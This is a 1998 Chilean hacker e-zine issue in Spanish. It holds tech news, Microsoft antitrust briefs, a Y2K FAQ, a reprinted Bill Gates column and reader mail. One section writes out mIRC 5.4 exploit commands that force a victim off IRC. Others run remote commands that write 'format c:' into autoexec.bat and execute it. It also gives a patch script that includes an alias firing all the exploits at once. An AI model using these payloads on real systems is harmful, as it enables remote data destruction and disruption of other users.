AUMENTO EL NUMERO DE VIRUS INFORMATICOS
Cada vez más empresas utilizan softwares antivirus como prevención, sin
embargo el número de computadoras afectadas es cada vez mayor de acuerdo a
un estudio realizado por la International Computer Security Association
(ICSA). De acuerdo al estudio realizado en 300 destacadas corporaciones e
instituciones de gobierno de los Estados Unidos que representan alrededor
de 750 mil PCs y servidores, el índice de infección de computadoras en 1998
es un 48% mayor que el reportado el año pasado, a pesar de que los
consultados afirmaron tener programas antivirus que funcionan
constantemente. Según miembros de la ICSA, la existencia y la proliferación
de virus mucho tiene que ver con el aumento en el uso del correo
electrónico y de Internet en general. "En este problema mucho tiene que ver
la creación de nuevos virus", manifestó Larry Bidwell, integrante del ICSA.
Y los números le dan la razón: se estima que entre 200 y 300 nuevos virus
son creados cada mes aunque no todos son distribuidos de inmediato, lo que
hace muy difícil actualizar los antivirus para prevenir infecciones.
http://www.news.com/News/Item/0,4,26312,00.html?st.ne.3.head

NUEVO SISTEMA PARA ACCEDER A LOS EMAILS SIN ENCENDER LA PC
Un novedoso servicio de notificación de emails original de Israel que está
desembarcando en los Estados Unidos propone una prática manera de chequear
el correo electrónico. MailPush, como es conocido el nuevo sistema, permite
a los usuarios con cuentas de email acceder a sus mensajes a través de
faxes, teléfonos, celulares o pagers sin la necesidad de estar en
permanente contacto con sus computadoras. El sistema, que también notifica
a quien envía el mensaje que sus emails llegaron a destino, es ofrecido
directamente a través de Internet por una unidad de Cellcom, la empresa de
telefonía celular más grande de Israel.  MailPush también planea distribuir
el servicio a través de las empresas proveedoras de Internet (ISP), al
mismo tiempo que no descartan implementarlo en forma directa a través de
las compañías de teléfono. Marc Schechtman, vicepresidente de MailPush,
manifestó que proyectan que "de aquí a un año, el 5% de los usuarios
norteamericanos de Internet se suscriban al servicio", y que planean
llevarlo a otros 20 países en un futuro cercano.

IBM VENDERA SU UNIDAD GLOBAL NETWORK   
En una operación que podría acercarle entre 3 y 4 mil millones de dólares,
IBM anunció que puso las operaciones de su importante unidad Global Network
a la venta. Hoy en día, esta importante red transmite datos de
corporaciones para alrededor de 30 mil clientes distribuidos en 900
ciudades de más de 50 países, lo que la convierte en una de las redes de
comunicación más extensas del mundo. La misma es una de las unidades que
más hizo crecer los servicios de comunicación de IBM en los últimos tiempos
y emplea más de 6000 trabajadores en todo el mundo. Pero sus altos costos
de mantenimiento hicieron que la empresa considerara desprenderse de ella,
alentados también por la presunción de que dejará de ser rentable debido a
los rápidos cambios que está experimentando la industria de las
telecomunicaciones. Otro de los factores que llevaron a IBM a tomar esta
decisión fue el surgimiento de nuevas empresas en el mercado que se
perfilan como importantes competidores, entre las que se destacan la
alianza entre AT&T y British Telecommunications, y la formación de la
denominada Global One entre Sprint, Deutsche Telekom, y France Telecom.

IBM INGRESA EN LA ERA DEL COBRE
El nuevo chip construido a base de cobre presentado por IBM significa un
paso muy importante para la empresa dentro del competitivo mundo de los
fabricantes de microprocesadores. Otros importantes productores como Intel,
Sun Microsystems y Compaq Computer también anunciaron que incursionarán en
el cobre, pero que lo harán dentro de una o dos generaciones de
procesadores. Por lo tanto IBM, con la distribución de su flamante
producto, se convirtió en la primera empresa en dar a conocer un procesador
basado en cobre. Con una velocidad de 400 MHZ, el PC 740/750 difiere de los
otros chips en que los cables son hechos con cobre en lugar de aluminio, lo
que hace que conduzca la electricidad en mejor forma y se presume que
traerá una nueva era de procesadores más poderosos que consumirán menos
energía y ocuparán menos lugar que los de aluminio. A pesar de que recién
estarán disponibles a nivel masivo el año que viene, IBM ya anunció que
todas las futuras versiones del chip Power PC serán basados en cobre, lo
que le permitirá a la empresa desarrollar procesadores de 1000 MHz y aún
más veloces.

DESARROLLAN UNA NUEVA FORMA DE ENVIAR GRAFICOS EN FORMA ONLINE
Internet puede estar llena de gráficos y fotos de excelente calidad, pero
capturarlas de la pantalla para imprimirlas se transforma en un reto que
suele demandar mucho tiempo. Con la intención de solucionar el problema,
Live Picture presentó ayer su programa Network Publishing, el cual aseguran
que permitirá a los usuarios bajar e intercambiar a través de la red
documentos que contengan mucho material gráfico en una forma rápida y
sencilla. Mientras informó que Adobe, Canon, y Sun Microsystems proveerán
soporte técnico para el flamante programa, Live Picture manifestó que la
idea detrás de Network Publishing es facilitar a individuos y empresas
enviar sofisticados documentos a través de Internet. "Las compañías podrán
diseñar folletos y distribuirlos a todo el mundo por la web en pocos
minutos para luego bajarlos a papel", manifestó Kate Mitchell, presidenta
de Live Picture, quien agregó que "con la tecnología actual no resulta
práctico imprimir un folleto, poster o informe y recién después
distribuirlo, e incluso tampoco es útil hacerlo a través de modems
standards porque se pierde mucho tiempo".

LLEGA UNA NUEVA CAMADA DE NOTEBOOKS
Otra ola de delgadas y modernas notebooks se espera que sean lanzadas al
mercado para fines de esta semana cuando haga su aparición el esperado
Pentium II 300-MHz de Intel para computadoras portátiles. Las ventas de las
notebooks bajaron en los últimos meses, especialmente en comparación con la
salida que tuvieron los desktops, y mucho tuvo que ver en esto el precio de
las portátiles. Empezando por máquinas que se comercializaban a 3200
dólares, la diferencia de precio entre las notebooks PCs de última
generación y los desktops era realmente importante, incluso la más grande
jamás registrada. A pesar de que las portátiles con procesadores de 233 y
266 MHz bajarán de precio con la llegada del nuevo chip, buena parte de las
notebooks se seguirán vendiendo por sobre los 2000 dólares en el mercado
estadounidense. Y todas las miradas estarán puestas en mañana, 9 de
septiembre, fecha de aparición de las nuevas máquinas con los procesadores
Pentium II de 300-MHz. Compaq lanzará la Armada 3500 y la 6500 e incluirá
el flamante chip en otros de sus productos, Gateway hará lo propio en su
línea de notebooks y Dell estrenará la Inspiron 7000. Otras de las empresas
que incorporarán el nuevo procesador de Intel son Toshiba, Hewlett-Packard
y NEC.

MOTOROLA PRESENTO SU SET-TOP COMPUTER
En momentos es que comienzan a surgir diferentes modelos de set-top TV que
permiten disfrutar de distintos contenidos audiovisuales, Motorola lanzó su
modelo de set-top computer para las compañías de cable que proveerán una
amplia variedad de contenidos multimedia incluyendo acceso a Internet y
reproducción de DVDs. De acuerdo a Motorola, su Blackbird se diferencia
ampliamente del WebTV de Microsoft y proveerá una plataforma que en un
mismo dispositivo permitirá disfrutar de productos y servicios con la más
avanzada tecnología 3D, juegos y películas en DVD y la posibilidad de
navegar en Internet. Jim Reinhart, ejecutivo de Motorola, manifestó que se
logró desarrollar este producto gracias a la utilización en conjunto de
procesadores PowerPC y avanzada tecnología multimedia de VM Labs. Reinhart
agregó que Blackbird permite "ver una película de un canal de cable,
emitida vía satélite o de un DVD, mientras que la misma tecnología se
utiliza para que el consumidor pueda disfrutar los más recientes y mejores
juegos de consolas". Si bien saben que llevará un tiempo para que el nuevo
producto sea masivo, en Motorola afirmaron que ya tienen pedidos por un
millón de unidades y estiman que la demanda aumentará con el correr de los
meses.
http://www.news.com/News/Item/0,4,26321,00.html?st.ne.2.gif.1
http://headline.gamespot.com/news/98_09/14_projectx/index.htm

INTEL BAJO LOS PRECIOS DE SUS CHIPS HASTA UN 34%
El fabricante de procesadores más importante del mundo informó que redujo
los precios de sus chips hasta un 34%, con lo que busca incrementar la
demanda mientras toma ventaja de la caída de los costos de fabricación.
Mientras Intel aumenta la producción de nuevos chips y traslada a los
usuarios el ahorro de costos en el proceso de fabricación, también reduce
los precios de los procesadores más viejos para poder posicionar los
nuevos. Intel, que solía bajar los precios una vez por trimestre,
últimamente comenzó a hacerlo todos los meses. En ésta reciente medida
redujo el precio de su chip más veloz, el Pentium II 400-MHz, en un 18%, y
también hizo lo propio con el Pentium II 350-MHz (29%), y con el 266-MHz
Pentium diseñado para laptops (34%).
http://www.techweb.com/wire/story/reuters/REU19980914S0003





SEGUIMIENTO EXAUSTIVO A MOCO$OFT (primer quincena del mes)
================================

MICROSOFT RECHAZO LAS ACUSACIONES DE SUN CON RESPECTO A JAVA (31 de agosto de 1998)
A través de un documento presentado ante la corte que interviene en el caso
el viernes 28 de agosto pasado, Microsoft rechazó enérgicamente las intimación
preliminar presentada por Sun Microsystems en su contra alegando que una
acción de ese tipo "causaría no sólo un gran daño a Microsoft sino también
a sus distribuidores, revendedores, desarrolladores de software e incluso a
los propios usuarios". En el mes de mayo, Sun presentó una intimación
preliminar argumentando que el Windows 98 incluye una versión de Java que
es incompatible con la desarrollada por ellos, por lo que solicita que se
obligue a Microsoft a incluir la versión de Sun en el flamante sistema
operativo y que se le impida a la compañía de Bill Gates distribuir el
Visual 6.0 hasta tanto no sea totalmente compatible con la versión standard
del Java de Sun. En su descargo realizado el viernes, Microsoft manifestó
que no sólo la empresa cumplió con la licencia sobre Java que mantiene con
Sun, sino que todos sus productos son compatibles con el sistema en
cuestión.

AMPLIARIAN EL CASO JUDICIAL DE MICROSOFT (1 de setiembre de 1998)
El Departamento de Justicia de los Estados Unidos y los 20 estados
norteamericanos que están demandando a Microsoft planean aumentar la
presión sobre la empresa de Bill Gates al incluir alegatos sobre nuevas
presuntas prácticas monopólicas y dañinas por parte del gigante del
software. Las nuevas acusaciones podrían ser presentadas hoy mismo e
incluirían evidencia que demostraría que Microsoft presionó a Intel para
que no tuviera en cuenta el software de su competidor Netscape
Communications, que manipuló su sistema operativo Windows para que no pueda
trabajar con productos de otras firmas, y que intentó dividirse el mercado
del software de audio y video con Apple Computer, de acuerdo a lo publicado
por el Seattle Times. Según estipula la ley norteamericana, el gobierno y
los estados sólo pueden incluir nueva evidencia en caso de que la misma
esté relacionada con los cargos antes presentados. El juez que entiende en
la causa, ahora deberá determinar si la nueva evidencia puede ser tenida en
cuenta para el juicio que comenzará el próximo 23 de septiembre.

MICROSOFT VENCIO A LA PRENSA (3 de setiembre de 1998)
El gigante del software argumentó ayer que las declaraciones que realizarán
Bill Gates y otros ejecutivos de la compañía en el caso que se le sigue a
Microsoft por presuntas actividades monopólicas tendrían que permanecer en
secreto por lo que la prensa y el público no deberían tener acceso a las
mismas. En una extensa presentación elevada a la corte federal de
apelaciones norteamericana, Microsoft reclamó que el artículo de una ley de
1913 que hace referencia a los testimonios en casos similares al que
enfrenta por estos días la empresa de Bill Gates no puede ser tenido en
cuentas ya que los juicios sobre actividades monopólicas cambiaron mucho
con respecto a los de principios de siglo. Los oficiales del Departamento
de Justicia  de los Estados Unidos estuvieron de acuerdo con la petición de
Microsoft. Por lo tanto, la orden que había dado el juez Thomas Penfield de
permitir el acceso de la prensa y el público tras la petición que habían
hecho empresas como Reuters y The New York Times no será tenida en cuenta y
tanto Gates como el resto de los ejecutivos testificarán en privado.

MICROSOFT DENUNCIA UNA EMBOSCADA (4 de setiembre de 1998)
La compañía de Bill Gates le dijo ayer a un juez federal que los fiscales
que la acusan de actividades antimonopólicas pretenden tenderle una
emboscada con la nueva evidencia que quieren presentar, y solicitó que la
misma no sea tenida en cuenta o que, de lo contrario, el juicio se demore
seis meses. En respuesta al nuevo material que el Departamento de Justicia
norteamericano y los 20 estados demandantes presentaron en los últimos
días, Microsoft aseguró que esa acción atenta contra la posibilidad del
gigante del software de preparase de la mejor manera posible para el
juicio. Los abogados de Microsoft manifestaron que "si la Corte accede al
pedido de los demandantes el juicio debe posponerse al menos seis meses
para poder tener la chance de recoger evidencia, y al mismo tiempo no debe
imponerse un límite en la cantidad de testigos que puedan ser convocados
por cualquiera de las dos partes".

OBLIGAN A MICROSOFT A PRESENTAR EVIDENCIA (7 de setiembre de 1998)
El juez federal Thomas Penfield Jackson ordenó a Microsoft entregar
evidencia relacionada a convenios comerciales que firmó con dos de sus
compañías socias. A través de un informe presentado el viernes, fiscales
del Departamento de Justicia de los Estados Unidos afirmaron que Microsoft
se había negado a su petición de presentar información relacionada a
acuerdos que la empresa de Bill Gates firmó con Intel y Apple Computers,
como así también contenidos de bases de datos vinculados a vendedores de
sistemas de computación que adquirieron el OS del gigante del software. A
raíz de ésta presentación se le ordenó a Microsoft que entregue el material
solicitado en forma inmediata. Más allá de esta medida, el juez aún no se
pronunció con respecto a lo solicitado por los abogados de Microsoft que
habían pedido que esa evidencia no se incluyera en el juicio o que, de lo
contrario, se pospusiera el mismo al menos seis meses. El magistrado
informó que esa determinación, que puede ser vital para el desarrollo del
juicio, la anunciará el 17 de septiembre.

IMPORTANTE EMPRESA CHINA UNE SUS FUERZAS CON MICROSOFT (9 de setiembre de 1998)
El gigante de la computación de China, Legend Holdings, trabajará con
Microsoft para introducir en el país nuevas computadoras portátiles del
tipo palm, las cuales incluirán una versión china del sistema operativo
Windows CE de Microsoft. Las flamantes computadoras, cuyo tamaño será
apenas un poco más grande que el de un cassette de audio, llegarán al
mercado en diciembre y se comercializarán, según el ejecutivo de Legend
Chen Jing, a 420 dólares. Microsoft ya se había unido con fabricantes de
productos electrónicos como Casio y Philips Electronics para producir
dispositivos portátiles que trabajaran con su Windows CE, pero para su
debut en el mercado chino prefirió asociarse con una empresa local. De esta
manera, la compañía de Bill Gates intenta sacar ventaja sobre su competidor
3Com, productora de las famosas PalmPilots, para transformarse en la
primera empresa en lanzar dispositivos manuales en China. 3Com anunció que
dará a conocer versiones locales de sus PalmPilots en toda Asia para fines
de este año.

LAS VENTAS DEL WINDOWS 98 SUPERARON LAS EXPECTATIVAS (10 de setiembre de 1998)
El número uno de Microsoft, Bill Gates, afirmó ayer que las ventas de su
flamante Windows 98 son mayores a las que se registraron tras la aparición
de su predecesor, el Windows 95, e incluso que las expectativas se
superaron ampliamente. En el marco de un encuentro sobre información
tecnológica realizado en Portugal, Gates manifestó que "si bien antes de su
lanzamiento no se creía que el Windows 98 pudiera superar las ventas del
Win 95, los números ahora demuestran que el nuevo sistema operativo tuvo
mayor aceptación que el anterior". Mientras comentó que Microsoft "es muy
buena desarrollando softwares masivos" y que el objetivo inmediato de la
compañía es hacer que sus productos sean cada vez más fáciles de utilizar,
Gates admitió que "Windows, Office y Backoffice representan cerca del 90%
de las ventas del grupo Microsoft".

NOVELL INCLUIRA EL EXPLORER DE MICROSOFT EN SUS PRODUCTOS (11 de setiembre de 1998)
En un sorpresivo movimiento que marca de alguna manera el buen momento por
el que está atravesando el Internet Explorer en cuanto a aceptación, Novell
anunció que ofrecerá el navegador de Microsoft en sus productos, incluido
el OS para servers NetWare 5. Rivales extremos en los mercados de sistemas
operativos y aplicaciones para desktops, Novell y la empresa de Bill Gates
harán coincidir por primera vez sus softwares en un mismo producto. El
Communicator de Netscape también será ofrecido con el NetWare, y así ambos
browsers interactuarán con el servidor de webs FastTrack que estará
incluido en el NetWare 5. Para explicar este sorpresivo convenio entre dos
empresas históricamente rivales, Christopher Stone, vicepresidente de
Novell, manifestó que "en momentos en que el 90% del mercado de los
browsers está acaparado por Microsoft y Netscape, Novell consideró que lo
más sensato era brindarle a sus clientes diferentes opciones para navegar
la web".


Preguntas mas frecuentes sobre los BUGS de Moco$oft
===================================================

¿Es compatible Windows 3.1 con el año 2.000?

Según informó la empresa Microsoft, tanto el Windows 3.1 como el Windows 95 
presentarán algunos errores estéticos en su versión original cuando llegue el 
cambio de milenio. Esto se deberá a que el desplegado de archivos creados en 
el 2.000 genera basura en la pantalla. No obstante, aseguran, este inconveniente 
no originará ningún error de cálculo ni destruirá información.

¿Presentará problemas con el tema del año 2000 la planilla de declaración jurada de 
IVA de la DGI?

Según informó la Administración Federal de Ingresos Públicos (AFIP), todos los programas
de los sistemas informáticos que el organismo utiliza para controlar la recaudación de 
impuestos serán totalmente compatibles con el 2000. Los expertos están trabajando en su 
reconvesión. Aunque la mayor parte del trabajo está lista, todavía faltan una serie de 
ajustes. Pero en la AFIP confían en que llegarán a tiempo.

¿El problema del 2000 afectará sólo a las computadoras?

No. También podrían afectar a los sistemas industriales, cajas de seguridad de bancos, 
juegos de parques de diversiones o ascensores automáticos. Por esto suele decirse que el 
problema se trata más de un problema electrónico que informático. El problema del 2000 
surgió cuando, en la década del sesenta, se programaron los sistemas para que reconzcan el 
cambio de año con dos dígitos en lugar cuatro. La idea era ahorrar espacio en la memoria, 
tiempo y dinero. Pero al llegar el 2000, muchos microprocesadores no podrán reconocer las dos 
primeras cifras.

¿Hay lugares en Internet con información acerca del problema del año 2000?

Sí. La Web cuenta con muchísimos sitios desde donde se puede consultar información sobre el 
fenómeno y métodos para chequear si la computadora propia está o no preparada para reconocer 
el cambio de milenio.

¿Qué es el sistema Fat 32?

Es un sistema de almacenamiento por el cual la computadora almacena la información en bloques.
Estos bloques, llamados clusters, tienen una cantidad fija de datos, Kilobytes (KB). 
Por ejemplo, en los discos cuyo tamaño varía entre 540 KB y 1 GB, los clusters tienen un tamaño 
de 16 K. Son los que trabajan con el sistema de almacenamiento Fat 16. En cambio, los que varían 
entre 1 y 2.1 GB, tienen 32 KB. Con el Fat 32, en cambio, el sistema que viene con el 
Windows 98, cada uno de estos bloques preasignados se achican. En efecto, cada cluster pasa a 
tener un espacio de 4 KB, de manera que permiten almacenar mayor cantidad de información o bien 
optimizar el espacio en el disco rígido para darle un respiro a la computadora sin tener que 
salir a comprar uno nuevo.

¿Se puede pasar al castellano a través de Windows Update? 

La única forma es reinstalar una versión de un idioma diferente, ya que no alcanza con cambiar 
solo un archivo. La instalacion de Windows con distinto idioma convendría hacerse en un 
directorio diferente para evitar conflictos, aunque habría que reinstalar todas las aplicaciones 
que funcionan bajo Windows.



Internet da ganancias
=====================

Internet está destinada a ser la forma dominante de información periodística, pero hasta que
alcance ese status en algunos años, será difícil para los medios de prensa obtener ganancias.
La audiencia es todavía demasiado pequeña como para interesar a los anunciantes.
"Gran parte del dinero que se obtendrá en Internet será el resultado del contenido de la
información, tal como ocurrió con la radio y la televisión -dije en 1996-. La revolución de la 
televisión que comenzó hace medio siglo, creó una serie de industrias, incluida la fabricación 
de aparatos de televisión. Sin embargo, los ganadores a largo plazo fueron aquellos que emplearon 
el medio para brindar información y entretenimiento.".
Eso no ha ocurrido todavía (también advertí -afortunadamente-que eso demoraría algún tiempo en 
concretarse).
Dos años más tarde, tengo una mejor perspectiva de cuánto demorarán las compañías en obtener 
éxito financiero con sus publicaciones interactivas. Ahora advierto que incluso, cuando es 
posible obtener ganancias, resulta todavía difícil determinar si muchos sitios en Internet 
podrán conseguir grandes beneficios vendiendo información o anuncios que acompañen a la 
información gratuita.
En los Estados Unidos, las cadenas de cable CNN y MSNBC y el periódico USA Today tienen sitios 
de gran volumen en Internet, pero todavía no logran grandes ganancias. Eventualmente, conseguirán 
beneficios pues cuando el agua sube de nivel hace flotar algunas embarcaciones.
Pero la publicidad en Internet probablemente deberá aumentar al menos cuatro veces antes de que 
aun los sitios más congestionados consigan ganancias de los anuncios. Y eso puede resultar aún 
más difícil para sitios con audiencias modestas. Tal vez algunos tengan gran éxito, pero no en 
el futuro inmediato.
Pero hay otras razones para trabajar en sitios de la Internet, además de los beneficios 
inmediatos. Algunas empresas están utilizando la red electrónica para promover productos.
Algunos sitios ya están teniendo éxito en materia financiera. Se trata de lugares que efectúan 
transacciones y usan el poder de la Internet para eliminar intermediarios y reducir costos. 
Por ejemplo, Expedia, uno de los sitios de mi empresa Microsoft, vende gran cantidad de pasajes 
aéreos y alquila habitaciones de hoteles.
Algunos sitios han conseguido ganancias, al menos entre los inversores, mediante la distribución 
de información o guiando a los usuarios hacia ciertos lugares de la Web.
La venta de ideas nunca ha sido un negocio que reditúe grandes beneficios, excepto para algunas 
empresas e individuos. Por ejemplo, no se obtiene mucho dinero escribiendo libros. Por supuesto, 
algunos autores ganan mucho dinero, pero eso no ocurre con la gran mayoría de ellos.
Algunas compañías que venden información o ideas en Internet obtendrán ganancias, 
pero la mayoría no.
Un área relativamente exitosa ha sido la venta de información relacionada con la industria de 
las computadoras. Internet es obviamente el mejor medio para llegar a usuarios interesados en 
computadoras. Por lo que los anunciantes están dispuestos a respaldar algunos de esos sitios.
Pero las publicaciones impresas tienen un problema. A medida que los diarios y revistas de la 
Internet mejoren, las suscripciones y avisos comenzarán a reducirse en dichas publicaciones. 
Las empresas periodísticas que tratan una edición electrónica como algo marginal quedarán 
desencantadas una vez que los anunciantes comiencen a cambiar el destino de sus avisos, y 
pongan su dinero en los medios electrónicos de comunicación.
En cuanto a las empresas de información más grandes y mejores de la Internet, la situación 
mejorará muchísimo una vez que se convierta en la principal vía informativa. Algo que ayudará 
será la televisión digital. La gente comenzará a enfilar hacia sitios de la Internet una vez que 
pueda establecer comunicación a través de sus aparatos de televisión. Algunos sitios podrían 
capturar parte de las ganancias que ahora enfilan hacia las redes de televisión.
Ponerse en contacto con un servicio de Internet o llamar páginas electrónicas a la pantalla será 
una tarea innecesaria una vez que las conexiones con Internet funcionen 24 horas al día.
Explorar Internet será realmente fascinante cuando cualquier usuario pueda llevar consigo una 
computadora pequeña y barata capaz de conectarse sin necesidad de cables.
En ese momento, Internet superará a cualquier otro medio de información.

BILL GATES (Primer Hacker ? :-))
Fundador y presidente de Mico$oft.



Bueno aki le ponemos un nuevo Bug para clientes IRC .. muy gueno ,, para ejecutar comandos
a distancias ... SMS ,, Backorifice , netspy jajaj ...
Funciona de la siguiente manera ..

Para clientes bajo Guindoze!!

/ctcpreply (nickname) ping $quit(i,am,owned)
Result:
*** ^DaWg^ (DaWg@cc576078-a.essx1.md.home.com) Quit (owned by nofear)

Para clientes Unix ..a travez de telnet al server por los puertos de siempre
6666 o 6667 etc...
Ya una vez conectado y teniendo nick .. hacemos lo siguiente ..

notice (nick) (press ctrl + a) ping $quit(i,am,owned)(press ctrl + a)
and bam!@#

Algunas otras cositas ue se pueden hacer ... serian 

 /ctcpreturn (nick) $run(echo,"echo,y,|,format,c:\",>,c:\autoexec.bat)
 /ctcpreturn (nick) $run(c:\autoexec.bat)


Ahora hecha a correr tu imaginacion .... ... ahhh los parches ...

el primero seria muy simple .. en tu cliente IRC ...typeas /events off
o ponle el siguiente parche ... guardalo como m54-fix-sploits.mrc y para 
salvarlos solo pones lo siguiente en tu cliente .."/load -rs m54-fix-sploits.mrc"


Bueno aki va el parche !!!



;mIRC 5.4 QuickFIX and Exploits
                    ;myn@efnet - 07/22/98


                    ;Here is the Quick Fix for all know mIRC 5.4 Exploits to date (07/22/98)

                    ;DCC exploit fix
                    ctcp *:DCC SEND: { if $4 == 9582342556 { .ignore -tu300 $wildsite | echo -a * Bad send request from $nick $+ : $+ $address $+ : $3- | halt } }
                    ctcp *:DCC RESUME: { if $4 == $null { .ignore -tu300 $wildsite | echo -a * Bad send request from $nick $+ : $+ $address $+ : $3- | halt } }

                    ;ctcpreply ping $asctime crash and $identifier Exploit fix
                    ;replace all instances of the event "on ctcpreply" with the one below

                    on 1:CTCPREPLY:PING* {
                      if (2147483647 isin $2) { echo -a * Incoming ctcpreply asctime exploit from $nick | halt }
                      if ($ isin $2-) { echo -a * Incoming ctcpreply identifier exploit --> $2- from $nick   | halt }
                      echo -a * [ $+ $nick PING reply]: $calc($ctime - $2-) sec(s)
                      halt
                    }

                    ;And as an added bonus for all you DALnet kiddies
                    ;This sends all known mIRC 5.4 exploits at once
                    alias m54kill {
                      if ($1) {
                        .ctcpreply $1 ping $!quit(I'm, a, DALnet, KiDDie)
                        %ip = $rand(600000000,4294967294)
                        .quote privmsg $1 : $+ $chr(1) $+ DCC SEND $r(1,99) $+ .txt %ip $r(113,9000) $+ $chr(1) $+ $lf $+ privmsg $1 : $+ $chr(1) $+ DCC RESUME $r(1,99) $+ .txt $+ $chr(1)
                        .ctcpreply $1 ping $!asctime(2147483647)
                        echo -a * Sent mIRC kills to $1
                        halt
                      }
                      echo -a * Parms [/m54kill nick/#channel]
                    }



NOTICIA DE ULTIMA HORA !!!!!

Saqueadores ... a desaparecido de geocities .. las razones serian las siguientes ...

 En el último número del e-zine SET (el 16) se publicó un trozo de
  log sacado del canal #hack del IRC hispano, en el que se mostraba
  la gran  sabiduría de  toda esta  gente que  frecuenta ese canal:
  después de  muchos años  de estudio han aprendido  a escribir  la
  palabra  'elite'  con números  y también  a dar  y,  sobre  todo,
  denegar OP's.

  Pues esta gente tan lista y con esa gran sabiduría han enviado un
  mail a geocities avisándoles de que hay una página  sobre hacking
  en su server y quejándose para que la quitaran. Y así lo hicieron.

  Por su culpa, SET está buscando otra web. Parece mentira  que esa
  gente, que ha aprendido lo que saben gracias a e-zines como SET o
  RareGaZz sean capaces de hacer eso. HAN CAIDO MUY BAJO!!!!.

  No quiero con esto decir que toda la gente de ese canal sea así de
  estúpida. Afortunadamente, sólo son  unos cuantos.  Yo conozco  a
  alguna gente de allí y os puedo asegurar que son buena gente, pero
  hay  otros que  piensan que  ser hacker  es  conseguir  OP en  los
  canales  de IRC  y luego  banear a  todo  aquel  que  pueden  para
  demostrar así su hombría.

Lamentamos profundamente esta situacion que le han generado al mas veterano de los E-Zine de lengua 
Hispana ... la verdad nos sentimos indignados de como personajes tan imbeciles no sean capaces de
manifestarse de otra forma que no sea la cobardia .... Señores de SET cuenten con NUESTRO APOYO
INCONDICIONAL PARA LO QUE SEA ,,,,








				~~~~~~~~~~~~~~~~~~~~~~~~~~~
				#				  #
				# 11.-AH llegado MAIL!!!  #
				#				  #
				~~~~~~~~~~~~~~~~~~~~~~~~~~~
_______________________________________________________________ By VaRioS

Bueno estamos estrenando esta seccion ... la verdad queremos que sirva para
hacer contactos o nos envien comentarios .... si nos empiezan a preguntar como
hacer esto y hacer esto otro no se si seamos capaces de responder vustras respuestas
ya que como he repetido varias veces todavia estamos en etapa de organizacion ..
ya que no somos ni grupo ni asocioacion .. hacker ... ni siquiera somo hackers....
solo hacemos un E-Zine que esperamos les sirva a todos ,,,,


_____________________________________________ Marco Antonio ..:mansor_00@xxxxxxx

Saludos 
Me algre, al saber de un tal proyecto r chileno
buena onda, al kacharlos en la 16 del set, me animo a ir a ver ke tal.

como primer comentario:

jejej realmente es gracioso tener mas o menos los profesores , jejej
onda la isla , raregazz, set, y  las otras ...jejeje  parece ke se
leyeron todas las ke salen en la  linkera de iberhack o en la de
cyberhack ....
pero todas estas  revistas habran llegado hacer  tan  geniales como lo
fue la gloriosa VZM liderada por mi amigo legion?

tambien,  me di cuenta ke estan bien  informados onda la brujala,
jejej  y las demas, no me extrañaria ke mencionaran un comentario de
los de la kriptopolis en alguna edicion
bueno....

---------------------------- PlaXiuS --------------------------------------
<:: Gracias y no te olvides de la Kriptonomicon , y varias listas de correo
como la de Raredudez que es Genial !!!::>
---------------------------------------------------------------------------
segundo comentario:

si bien es cierto, que en la chile hay buenos hackers, los hackerz no
son privativo de los lokos de la U, tambien los hay en la UFRO,
(universidad de la frontera) quienes diseñaron un virus, mas o menos
bueno, con una  bonita  interfaz  grafika y ke los antivirus
tradicionales  no sakaba  (por lo menos hasta el 96) seria  bueno
tratar de ubikarlos y haber ke kuenten sus logros.
pero kreo ke los mas avanzados en chile en la tematika, y ke se
instruyeron directamente de los  gringos (2600, preack, anarky y otros)
son los de la santa maria. sin lugar a dudas.
pero tampoko hay ke desmerecer a los kolegas de la kato ke si bien no
somos famosos, (eso ya es un gran logro  hoy por hoy para un verdadero
jaker) hemos hechos mas de  una ke otra kosita por ahi.

---------------------------- PlaXiuS -------------------------------------
<:: Solo era un comentario .. pero es verdad hay excelentes hackers en las
diversas universidades del país , asi como tambien hay informaticos que no
tienen idea de nada !!! .. Han escuchado hablar del virus katiuska ... dicen 
que es un HOAX .. de lo cual yo no estaria tan seguro , pero desgraciadamente
los chilenos somos bastantes desconocidos en el ambiente .... por que no
hay un circulo de comunicacion  , Ahhh y como simpre lo he dicho no me considero
hacker ... creo que estoy a años luz para llegar a parecerme a uno .. lo unico que
deseo con este E-Zine es crear una conciencia informatica y que aprendamos a
utilizar todos nuestros recursos y que las empresas e instituciones tomen medidas
al respecto .... que no se confien mucho !!!::>
--------------------------------------------------------------------------

tercer comentario:

es super aplusible ke kieran darle duro con el linux.
ke sin duda no es kosa facil, y a manera de aporte les paso este link
(si es ke no lo tenian) donde salen las traducciones del how ...? y
muchas  cosas mas como una intro a mi adorado debian.  
jejej
http://www.cs.us.es/archive/linux.html

tambien les doy este otro link ke es un programa para controlar la
tarifa telefonika de conexion.
-¿y cual es la gracia?
tiene dos  gracias
-¿cuales ?
una es en español
-¿asi?.....  ¿ya y....?
la otra es ke tiene las tarifas de ese olvidado lugar del mundo
llamado chile, osea  tiene una version pensada para este extraño
lugar, osea es una version de control de telefono pensada en la
telefonika chile....
-¿y ke mas?
bueno eso es todo....
shi.... lo encontrai poko? dime dos programas decentes de uso util ke
esten pensado en este extraño lugar y tengan onda telefonika.... 
si mas chamullo este es el enlace

http://www.interlan-stc.es/webs/leo/gtel/ 


---------------------------- PlaXiuS -------------------------------------
<:: Sobre el Linux le vamos a seguir dando duro ... que sepan que mocosoft
nos vende pura basura .. !!!   gracias por el Link  bueno por los dos !!! vamos
a hecharle una miradita al tarificador ....(milagro se acordaron que existiamos)Ahh
se me le orvidaba ,, en la ultima PCWorld Chile , viene un cd de LINUX GRATIS ,,,
creo que de la distribucion S.U.S.E.::>>
---------------------------------------------------------------------------

cuarto comentario:

¿ustedes saben de alguna bbs ke trate la tematika esta decente y con
alturas?
y obviamente este en santiago
bueno aparte de las bbs ke duran 3 horas y son para el uso de los
kolegas...

---------------------------- PlaXiuS -------------------------------------
<:: Creo que ninguna .. pero han escuchado hablar de BBS Virgo .. pero es de
Valpo .??::>>
--------------------------------------------------------------------------

kinto comentario:

hace mas de un año (¿?) un kolega me comento un encuentro furtivo con
un loko ke trabajaba  en la bolsa de comercio (¡!) ke hablaba de hack,
virus y  cosas del tema, y ke tubo una discuzion con mi kolega, onda
por dos kosas, una por la defensa de los lamerz users op del #chile
(segun mi kolega) ke hacia este personaje, y otra por politika....
ademas me komento de una pagina muy pretenciosa pero en verdad
desastroza, ke en una de sus <title> tenia algo asi de SIN CENSURA o
algo por el estilo donde se hacia una defensa de un tipejo llamado
pinocho, y se impelia a la gente al olvido.

<:: Para ser op no es necesario ser un superhacker o algo por el estilo ..
